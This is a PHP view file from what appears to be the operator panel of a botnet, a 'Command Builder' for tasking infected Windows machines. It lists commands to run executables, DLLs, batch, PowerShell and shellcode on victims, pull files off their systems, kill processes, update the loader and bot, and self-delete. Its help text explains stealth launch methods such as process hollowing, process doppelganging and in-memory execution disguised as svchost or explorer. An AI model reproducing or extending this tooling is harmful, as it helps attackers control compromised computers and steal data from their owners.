<?php
use kartik\popover\PopoverX;
use kartik\select2\Select2;
use yii\web\JsExpression;
use kartik\widgets\FileInput;
use yii\helpers\Url;
use yii\widgets\ActiveForm;
use yii\helpers\Html;
use common\models\UploadForm;
use common\models\Files;
use yii\web\UploadedFile;
use backend\models\Admin;

$m = Files::find()->orderBy(['filename'=>SORT_ASC,'created_at'=>SORT_DESC])->where(['group'=>''])->all();
$files = [];
$files['nofile']='...';

$format = new JsExpression(
    "function format(icon) {
                    return '<i class=\"'+ icon.id +'\" aria-hidden=\"true\"></i> '  + icon.text.replace('-', ' ');
                }"
);

$commandtype = [
    'nop'=>'No Operation', 
    'getinfo'=>'Get System Info',
    'runexe'=>'Run .exe',
    'rundll'=>'Run .dll',
    'runbat'=>'Run .bat',
    'runpws'=>'Run PowerShell',
    'runcode'=>'Run Shell Code',
    'reset'=>'Reset',
    'terminate'=>'Terminate Process',
    'download'=>'Download File',
    'suicide'=>'Suicide',
    'update'=>[
        'updateloader32'=>'Upload loader x86',
        'updateloader64'=>'Upload loader x64',
        'updatebot32'=>'Upload bot x86',
        'updatebot64'=>'Upload bot x64',
        'updatenow'=>'Force update now',
    ],
];


$runtype = [
    'hollowing' => 'Process Hollowing',
    'dopple' => 'Process Doppelganging',
    'create' => 'CreateProcess',
    'channel' => 'Run from Memory',
    'dump' => 'Dump and Run',
];

$timeout = [
    '0' => 'background run',
    '30' => '30 sec.',
    '60' => '1 min',
    '300' => '5 min.',
    '600' => '10 min',
    '1800'=>'30 min',
    '3600' => '1 hr.',
    '10800' => '3 hrs.',
    '21600'=>'6 hrs.',
    '43200'=>'12 hrs.'
];

$mask = [
    'notuse' => 'Not use',
    'notepad' => 'notepad.exe',
    'explorer' => 'explorer.exe',
    'scvhost' => 'svchost.exe',
    'cmd' => 'cmd.exe',
];

?>
<script type="text/javascript">
    file_attr = new Array();
    file_dd = '';
    last_id = 0;
<?php
foreach ($m as $key => $value) {
    $files[$value['storedfilename']]=$value['filename'];
    ?>
    file_attr.push("<?=$value['storedfilename']; ?>","<?=$value['filename']; ?>","<?=$value['size']; ?>","<?=$value['created_at']; ?>","<?=$value['hashmd5']; ?>","<?=(isset(Admin::findOne(['id'=>$value['admin_id']])->login)) ? Admin::findOne(['id'=>$value['admin_id']])->login : ''; ?>","<?=$value['id'];?>"); 
    <?php
}
?>
</script>


<div>
    <h4 style="text-align: center;">Command Builder</h4>
    <hr>

    <table class="special_form1" style="text-align: center;">
    <tbody>
        <tr>
            <td style="min-width: 180px;">
                <div>
                <label class="control-label">Command Type</label>&nbsp;
                    <?= PopoverX::widget([
                        'header' => false,
                        'size' => PopoverX::SIZE_LARGE,
                        'placement' => PopoverX::ALIGN_RIGHT_TOP,
                        'content' => '<p><b>no_operation</b> command is needed to ping the bot, and to adjust its wakeup timeout.</p>
                        <p><b>Get_SystemInfo</b> is needed to obtain the information about the system where the bot resides.</p>
                        <p><b>Run_DLL</b> You can upload and run the Dll via rundll32.exe command.</p>
                        <p><b>Run_BAT</b> Here you can run .bat script.</p>
                        <p><b>Run_PWS</b> Here you can run a PowerShell script.</p>
                        <p><b>Reset</b> If the bot stalled with the last command, reset it here.<br> The result of the last command will be lost; although you can run a new command then.</p>
                        <p><b>Terminate_Process</b> You can terminate any process by PID.</p>
                        <p><b>Download</b> You can download any file from system</p>
                        <p><b>Suicide</b> Remove ourselves from system.</p>' ,
                        'footer' => false,
                        'toggleButton' => ['label'=>false, 'class'=>'glyphicon glyphicon-question-sign', 'tag' => 'span'],
                    ]); ?>
                    
                <?= Select2::widget([
                    'id' => 'commandtype',
                    'name' => 'commandtype',
                    'data' => $commandtype,
                    'options' => ['onchange' =>"initcommand()",'class' => 'selectcommand'],

                ]);
                ?>
                </div>
            </td>
            <td id="runtype" style="min-width: 180px;" class='hidetab'>
                <div>
                <label class="control-label">Run type</label>&nbsp;
                <?= PopoverX::widget([
                        'header' => false,
                        'size' => PopoverX::SIZE_LARGE,
                        'placement' => PopoverX::ALIGN_RIGHT_TOP,
                        'content' => '<p><b>How the child process will be spawned:</b></p>
                        <p><b>Process Hollowing</b> a technique by creating a trusted process (such as notepad.exe, svchost.exe) and make it a zombie by replacing its code with our file.</p>
                        <p><b>Process Doppelganging</b> another technique that exploits a trusted process via fake NTFS transaction.</p>
                        <p><b>CreateProcess</b> is a good old "save file to disk and execute it". Should be used as a last resort only, because the file to run is being saved to the hard disk!</p>
                        ' ,
                        'footer' => false,
                        'toggleButton' => ['label'=>false, 'class'=>'glyphicon glyphicon-question-sign', 'tag' => 'span'],
                    ]); ?>
                <?= Select2::widget([
                    'id' => 'selectruntype',
                    'name' => 'runtype',
                    'data' => $runtype,
                    'options' => [
                        'onchange' =>"buildcommand()",
                        'class' => 'selectcommand',
                    ],

                ]);
                ?>
                </div>
            </td>
            <td id="timeout" style="min-width: 120px;">
                <div>
                <label class="control-label">Timeout</label>&nbsp;
                <?= PopoverX::widget([
                        'header' => false,
                        'size' => PopoverX::SIZE_LARGE,
                        'placement' => PopoverX::ALIGN_RIGHT_TOP,
                        'content' => '<p>How many time will we wait until the command finishes.<br>
                        Next command cannot be run during that time.</p>
                        <p>Command can be run also in <b>background</b> mode</p>' ,
                        'footer' => false,
                        'toggleButton' => ['label'=>false, 'class'=>'glyphicon glyphicon-question-sign', 'tag' => 'span'],
                    ]); ?>
                <?= Select2::widget([
                    'id' => 'timeoutselect',
                    'name' => 'timeout',
                    'data' => $timeout,
                    'value' =>'60',
                    'options' => [
                        'onchange' =>"buildcommand()",
                        'class' => 'selectcommand',
                    ],

                ]);
                ?>
                </div>
            </td>
            <td id="mask" class='hidetab'>
                <div>
                <label class="control-label">Host Process</label>&nbsp;
                <?= PopoverX::widget([
                        'header' => false,
                        'size' => PopoverX::SIZE_LARGE,
                        'placement' => PopoverX::ALIGN_RIGHT_TOP,
                        'content' => 'This is the zombie process for Process Hollowing/Doppelganging techniques' ,
                        'footer' => false,
                        'toggleButton' => ['label'=>false, 'class'=>'glyphicon glyphicon-question-sign', 'tag' => 'span'],
                    ]); ?>
                <?= Select2::widget([
                    'id' => 'selectmask',
                    'name' => 'mask',
                    'data' => $mask,
                    'options' => [
                        'onchange' =>"buildcommand()",
                        'class' => 'selectcommand',
                    ],

                ]);
                ?>
                </div>
            </td>
            <td id="uploadfile" class='hidetab fileuploader' style="min-width: 250px;">
                <label class="control-label">Select/Upload execution file</label>&nbsp;
                <?= PopoverX::widget([
                        'header' => false,
                        'size' => PopoverX::SIZE_MEDIUM,
                        'placement' => PopoverX::ALIGN_LEFT_TOP,
                        'content' => '<p><b>Select</b> already existing file in Dropdown field</p>
                        <p>or</p>
                        <p><b>Upload</b> new executoin EXE,DLL,BAT or PWS file by clicking "Browse".
                        <p>New file will be added to Dropdown file list</p>' ,
                        'footer' => false,
                        'toggleButton' => ['label'=>false, 'class'=>'glyphicon glyphicon-question-sign', 'tag' => 'span'],
                    ]); ?>
                <div style="display: flex;">
                    
                    <?= Select2::widget([
                        'id' => 'selectFileUpLoad',
                        'name' => 'files',
                        'data' => $files,
                        'options' => [
                            'onchange' =>"buildcommand()",
                            'class' => 'selectcommand selectcommand--select',
                        ],
                        'pluginOptions' => [
                            'templateResult'    => $format,
                            'templateSelection' => $format,
                            'escapeMarkup'      => new JsExpression("function(m) { return m; }"),
                            'allowClear'        => false,
                        ],
                    ]);
                    ?>
                    
                    <div style="position: relative;">
                    <?=FileInput::widget([
                        'name' => 'file',
                        'options' => [
                            'multiple' => true, 
                            'id' => 'botFileLoad'
                        ],
                        'pluginOptions' => [
                            'allowedFileExtensions' => ['exe', 'dll', 'pws', 'bat', 'ps1'],
                            'previewFileType' => 'any', 
                            'showUpload' => false, 
                            'showRemove' => false, 
                            'initialPreviewAsData' => true, 
                            'overwriteInitial' => true,
                            "uploadUrl" => Url::to(['/upload','group'=>$model->groups]),
                            'msgUploadBegin' => '',
                            'msgUploadThreshold' => '',
                            'msgProgress' => '',
                            'msgLoading' => '',
                            'msgPendingTime' => '',
                            'msgCalculatingTime' => '',
                            'msgUploadEnd' => 'Done',
                            'dropZoneClickTitle'=>'',
                            "uploadAsync" => true,
                            "browseOnZoneClick"=>false,
                            'showPreview' => false,
                            'showUploadStats' => false,
                            'showCancel' => false,
                            'fileActionSettings' => [
                                'showZoom' => false,
                                'showRemove' => false,
                                'showUpload' => false,
                            ],
                            'maxFileCount' => 20, 'maxFileSize' => 1000000, 'msgPlaceholder' => '',
                        ],
                        'pluginEvents' => [
                            'filebatchselected' => 'function() {
                             $(this).fileinput("upload");
                             }',

                        ],
                    ]);
                    ?>
                    </div>
                
                </div>
            </td>
            <td id="cmdline" class='hidetab' style="min-width: 160px;">
                <div>
                <label id="cmdline-label" class="control-label"></label>&nbsp;
                <?= PopoverX::widget([
                    'header' => false,
                    'options' => ['id' => 'options-area'],
                    'size' => PopoverX::SIZE_MEDIUM,
                    'placement' => PopoverX::ALIGN_LEFT_TOP,
                    'content' => '<p><b>Type</b> your command line for execution file or script, PID for process must be terminated or name of file will be downloaded<p>
                     
                    ' ,
                    'footer' => false,
                    'toggleButton' => ['label'=>false, 'class'=>'glyphicon glyphicon-question-sign', 'tag' => 'span'],
                ]); ?>
                <input id="cmd" name="cmd" class="special_form1 form-control selectcommand" onchange="buildcommand()" style="width: 100%;">
                </div>
            </td>
            <td id="scriptarea" class='hidetab' style="min-width: 160px;max-width: 160px;">
                <div>
                <label class="control-label script-label">Script</label>&nbsp;
                <?= PopoverX::widget([
                    'header' => false,
                    'size' => PopoverX::SIZE_MEDIUM,
                    'placement' => PopoverX::ALIGN_LEFT_TOP,
                    'content' => '<p><b>Place</b> your script to resizable box below<p>
                    <p>or</p><p><b>Upload</b> them in "Select/Upload execution file" section.</p> 
                    <p>Script will be appear in resizable box after being uploaded.</p><p>Your uploaded script not will be saved as execution file, but will be saved in command history table.' ,
                    'footer' => false,
                    'toggleButton' => ['label'=>false, 'class'=>'glyphicon glyphicon-question-sign', 'tag' => 'span'],
                ]); ?>
                <textarea id="script" name="script" class="special_form1 form-control selectcommand" onchange="buildcommand()" style="width: 100%;max-width: 151px;" rows="1" resize="true"></textarea>
                </div>
            </td>
        </tr>
    </tbody>
    </table>
    
</div>

<div id="fastdeletemodalmask" class="modal-backdrop fade in" style="z-index: 1040;display: none;"></div>

<div class="modal bootstrap-dialog type-warning fade size-normal in" role="dialog" aria-hidden="true" id="fastdeletemodal" aria-labelledby="fastdeletemodal_title" tabindex="-1" style="z-index: 1050; display: none; padding-right: 12px;">
    <div class="modal-dialog">
        <div class="modal-content">
            <div class="modal-header">
                <div class="bootstrap-dialog-header">
                    <div class="bootstrap-dialog-close-button" style="display: block;">
                        <button class="close" data-dismiss="modal" aria-label="close" id="fastdeletemodalclose">×</button>
                    </div>
                    <div class="bootstrap-dialog-title" id="fastdeletemodal_title">Confirmation</div>
                </div>
            </div>
            <div class="modal-body">
                <div class="bootstrap-dialog-body">
                    <div class="bootstrap-dialog-message">Are you sure to delete this item?</div>
                </div>
            </div>
            <div class="modal-footer">
                <div class="bootstrap-dialog-footer">
                    <div class="bootstrap-dialog-footer-buttons">
                        <button class="btn btn-default" id="fastdeletemodalcancel">
                            <span class="glyphicon glyphicon-ban-circle"></span>
                              Cancel
                          </button>
                          <button class="btn btn-warning" id="fastdeletemodalok">
                            <span class="glyphicon glyphicon-ok"></span>
                             Ok
                         </button>
                     </div>
                 </div>
             </div>
         </div>
     </div>
 </div>

<div id="doublefilemodalmask" class="modal-backdrop fade in" style="z-index: 1040;display: none;"></div>

<div class="modal bootstrap-dialog type-warning fade size-normal in" role="dialog" aria-hidden="true" id="doublefilemodal" aria-labelledby="doublefilemodal_title" tabindex="-1" style="z-index: 1050; display: none; padding-right: 12px;">
    <div class="modal-dialog">
        <div class="modal-content">
            <div class="modal-header">
                <div class="bootstrap-dialog-header">
                    <div class="bootstrap-dialog-close-button" style="display: block;">
                        <button class="close" data-dismiss="modal" aria-label="close" id="doublefilemodalclose">×</button>
                    </div>
                    <div class="bootstrap-dialog-title" id="doublefilemodal_title">Confirmation</div>
                </div>
            </div>
            <div class="modal-body">
                <div class="bootstrap-dialog-body">
                    <div class="bootstrap-dialog-message">Such file allready exist!<br>You can cancel uploading file and use existing file or keep both files.</div>
                    <div id="doublefileinfo"></div>
                </div>
            </div>
            <div class="modal-footer">
                <div class="bootstrap-dialog-footer">
                    <div class="bootstrap-dialog-footer-buttons">
                        <button class="btn btn-default" id="doublefilemodalcancel">
                            <span class="glyphicon glyphicon-ban-circle"></span>
                              Cancel
                          </button>
                          <button class="btn btn-warning" id="doublefilemodalok">
                            <span class="glyphicon glyphicon-ok"></span>
                             Keep
                         </button>
                     </div>
                 </div>
             </div>
         </div>
     </div>
 </div>

<div id="errormodalmask" class="modal-backdrop fade in" style="z-index: 1040;display: none;"></div>

<div class="modal bootstrap-dialog type-warning fade size-normal in" role="dialog" aria-hidden="true" id="errormodal" aria-labelledby="errormodal_title" tabindex="-1" style="z-index: 1050; display: none; padding-right: 12px;">
    <div class="modal-dialog">
        <div class="modal-content">
            <div class="modal-header">
                <div class="bootstrap-dialog-header">
                    <div class="bootstrap-dialog-close-button" style="display: block;">
                        <button class="close" data-dismiss="modal" aria-label="close" id="errormodalclose">×</button>
                    </div>
                    <div class="bootstrap-dialog-title" id="errormodal_title">Error!</div>
                </div>
            </div>
            <div class="modal-body">
                <div class="bootstrap-dialog-body">
                    <div class="bootstrap-dialog-message">Required field(s) empty.</div>
                    <div id="doublefileinfo"></div>
                </div>
            </div>
            <div class="modal-footer">
                <div class="bootstrap-dialog-footer">
                    <div class="bootstrap-dialog-footer-buttons">
                        <button class="btn btn-default" id="errormodalcancel">
                            <span class="glyphicon glyphicon-ban-circle"></span>
                              Cancel
                        </button>
                        
                     </div>
                 </div>
             </div>
         </div>
     </div>
 </div>